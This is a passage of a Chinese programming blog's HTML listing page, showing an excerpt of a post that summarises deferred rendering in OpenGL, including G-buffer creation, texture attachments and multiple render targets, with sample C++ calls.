		<a class="list__footer-readmore btn" href="/posts/3c4ba6e45adf2f36fddd316ec3eb8189/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0c4359a3c8ec1f3809335486ca56ccb/" rel="bookmark">
			延迟渲染总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		延迟渲染总结 1 准备阶段1. G-buffer创建(1) 创建G-buffer帧缓冲(2) 为G-buffer创建三个纹理附件(颜色附件)(3) 用多渲染目标（MRT）方法将对应数据分配到各个颜色附件 2. 着色器，模型和光源设置(1)着色器设置(2)模型设置(3)光源设置 2 几何阶段1 顶点着色器2 片元着色器 3 光照处理阶段1 cpp程序2 shaderlightingpass着色器(1)顶点着色器(2) 片元着色器 4 问题1 延时是啥呢，和正向渲染有啥区别呢2 延时渲染的缺点 5 代码 1 准备阶段 1. G-buffer创建 (1) 创建G-buffer帧缓冲 创建了G-buffer,因为接下来的操作要在该帧缓冲上进行，第三行我们在这里绑定到G-buffer帧缓冲上；
unsigned int gBuffer; glGenFramebuffers(1, &amp;gBuffer);//Gbuffer创建 glBindFramebuffer(GL_FRAMEBUFFER, gBuffer);//绑定该缓冲 如果没有第三行绑定到gbuffer缓冲上的话，会出现什么问题呢？
没有第三行的绑定的话后面的三个纹理附件就会绑定在默认的帧缓冲上，即前置缓冲器中，也就是屏幕显示帧缓冲上；这样的话就会把第一次没有光照的场景渲染到G-buffer中，而后面的三个纹理附件就没有任何数据，后面的光照计算也就没有数据了，会导致黑屏；
(2) 为G-buffer创建三个纹理附件(颜色附件) gPosition顶点位置信息；gNormal法线信息；gAlbedoSpec颜色信息和镜面强度值； //position-位置信息作为一个例子 //1.纹理创建以及绑定 glGenTextures(1, &amp;gPosition); glBindTexture(GL_TEXTURE_2D, gPosition); glTexImage2D(GL_TEXTURE_2D, 0, GL_RGB16F, SCR_WIDTH, SCR_HEIGHT, 0, GL_RGB, GL_FLOAT, NULL); glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST); glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST); //2.将相应的纹理绑定到帧缓冲的对应缓冲区 glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, gPosition, 0); (3) 用多渲染目标（MRT）方法将对应数据分配到各个颜色附件 多渲染目标技术：将每个像素的数据保存到帧缓冲不同的缓冲区中，使得这些缓冲区的数据由此可以进行后续的计算；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0c4359a3c8ec1f3809335486ca56ccb/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/256/">«</a>
	<span class="pagination__item pagination__item--current">257/321</span>
	<a class="pagination__item pagination__item--next btn" href="/page/258/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>